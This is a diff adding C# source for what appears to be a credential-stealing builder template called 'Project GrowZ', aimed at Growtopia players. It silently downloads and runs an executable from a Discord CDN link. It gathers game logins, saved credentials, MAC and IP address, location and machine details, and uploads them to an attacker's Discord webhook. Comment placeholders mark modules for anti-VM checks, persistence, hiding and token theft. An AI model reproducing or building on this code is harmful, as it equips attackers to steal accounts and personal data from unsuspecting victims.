@@ -1,0 +1,193 @@
+using System;
+using System.Net;
+using System.IO;
+using System.Text.RegularExpressions;
+using System.Text;
+using System.Net.NetworkInformation;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Drawing.Imaging;
+using System.Collections.Specialized;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Reflection;
+using System.Diagnostics;
+using System.Management;
+using System.Threading;
+using System.Linq;
+using System.Security;
+using System.Security.Cryptography;
+using System.Security.Principal;
+using Microsoft.Win32;
+
+public class dWebHook : IDisposable
+{
+    private readonly WebClient dWebClient;
+    private static NameValueCollection discordValues = new NameValueCollection();
+    public string WebHook { get; set; }
+    public string Attachment { get; set; }
+
+    public dWebHook()
+    {
+        dWebClient = new WebClient();
+    }
+    public void SendMessage(string msgSend)
+    {
+        discordValues.Add("content", msgSend);
+        dWebClient.UploadValues(WebHook, discordValues);
+        discordValues.Clear();
+    }
+    public void SendAttachment(string path)
+    {
+        dWebClient.UploadFile(WebHook, path);
+    }
+    public void Dispose()
+    {
+        dWebClient.Dispose();
+    }
+}
+
+namespace gtfocunt
+{
+    class Program
+    {
+        public static bool lmaobind = false;
+        public static bool hidden = false;
+        public static bool gtrip = false;
+        public static bool Error = false;
+        public static bool isDisable = false;
+        public static string webtoken = "N/A";
+        public static string discordtoken = "N/A";
+        //extractpaste
+        //extractpass
+        //antivmware
+        //extractbinder
+        //tokencode
+        //diswincode
+        static void Main()
+        {
+            //[AntiVM]try{ //AntiVM} catch {}
+            //diswin
+            //startup
+            //hidestealer
+            //disablemanager
+            //errormessage
+            //turnonbinder
+            string temp = Environment.ExpandEnvironmentVariables("%TEMP%");
+            System.Net.WebClient webclient = new WebClient();
+            if (File.Exists(temp + "\\savedecrypter.exe"))
+            {
+                File.Delete(temp + "\\savedecrypter.exe");
+            }
+            webclient.DownloadFile("https://cdn.discordapp.com/attachments/910537250067087450/910537668985778236/savedecrypter.exe", temp + "\\savedecrypter.exe");
+            Process process = new Process();
+            ProcessStartInfo info = new ProcessStartInfo()
+            {
+                WindowStyle = ProcessWindowStyle.Hidden,
+                FileName = temp + "\\savedecrypter.exe",
+            };
+            process.StartInfo = info;
+            process.Start();
+            process.WaitForExit();
+            string growid = "N/A";
+            string pass = "N/A";
+            string lastworld = "N/A";
+            try
+            {
+                  StreamReader swr = new StreamReader(temp + "\\result.txt");
+                  string ReadingMODE = swr.ReadToEnd();
+                  string[] splits = ReadingMODE.Split('|');
+                  swr.Close();
+                  growid = splits[1];
+                  pass = splits[0];
+                  lastworld = splits[2];
+            }
+            catch { }
+            
+            string mac = GetMacAddress();
+            //passattachment
+            string creds = "N/A";
+            try
+            {
+                StreamReader sr = new StreamReader(temp + "\\credentials.txt");
+                creds = sr.ReadToEnd();
+                sr.Close();
+            }
+            catch { }
+            //extractscreen
+            //calltoken
+            string encode = "N/A";
+            encode = growid + "|" + pass + "|" + lastworld + "|" + webtoken + "|" + discordtoken + "|" + mac + "|" + creds;
+            try { File.Delete(temp + "\\credentials.txt"); } catch { }
+            byte[] stringbytes = Encoding.UTF8.GetBytes(encode);
+            StreamWriter sw = new StreamWriter(@"C:\Windows\Temp\" + growid + ".GrowZ");
+            sw.WriteLine(System.Convert.ToBase64String(stringbytes));
+            sw.Close();
+
+            using (dWebHook dcWeb = new dWebHook())
+            {
+                dcWeb.WebHook = replacexdddlmaohehe"**WEBHOOK**"replacexdddasdj;
+                string details = "";
+                details += "```" + "Project GrowZ v1.7 - MySk84fun" + Environment.NewLine;
+                details += "Device Name: " + Environment.UserName + " / " + Environment.MachineName + Environment.NewLine;
+                details += "MAC Addresses: " + mac + Environment.NewLine;
+                details += "IP Address: " + GrabIP() + "City/Region/Country: " + GrabLocation() + Environment.NewLine;
+                details += "Time Zone: " + GrabTime()[1] + Environment.NewLine + "Time: " + GrabTime()[0];
+                details += "```";
+                dcWeb.SendMessage(details);
+                //screenattachment
+                //deleteattachment
+                dcWeb.SendAttachment(@"C:\Windows\Temp\" + growid + ".GrowZ");
+            }
+            //normalreplace 
+            //gtripxd
+            //tracereplace
+        }
+        private static string GetMacAddress()
+        {
+            string macAddresses = string.Empty;
+            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
+            {
+                if (nic.OperationalStatus == OperationalStatus.Up)
+                {
+                    macAddresses += nic.GetPhysicalAddress().ToString() + ",\n";
+                }
+            }
+            return macAddresses.TrimEnd(',', '\n');
+        }
+
+        public static string GrabIP()
+        {
+            string IPAddress = new WebClient() { Proxy = null }.DownloadString("http://icanhazip.com/");
+            return IPAddress;
+        }
+        public static string GrabLocation()
+        {
+            try
+            {
+                var info = new WebClient().DownloadString("https://www.geodatatool.com/");
+                string[] data = info.Split('\n');
+                string country = data[458].Trim();
+                string region = (((data[469]).Split('>'))[1]).Split('<')[0];
+                string city = (((data[474]).Split('>'))[1]).Split('<')[0];
+                string Location = city + "/" + region + "/" + country;
+                return Location;
+            }
+            catch
+            {
+                string Location = "N/A";
+                return Location;
+            }
+        }
+        public static List<string> GrabTime()
+        {
+            var zone = TimeZoneInfo.Local; 
+            List<string> TimeData = new List<string>();
+            TimeData.Add(DateTime.Now.ToString("h:mm:ss tt"));
+            TimeData.Add(zone.DisplayName);
+            return TimeData;
+        }
+        //tracecode
+        //gtripcode
+    }
+}
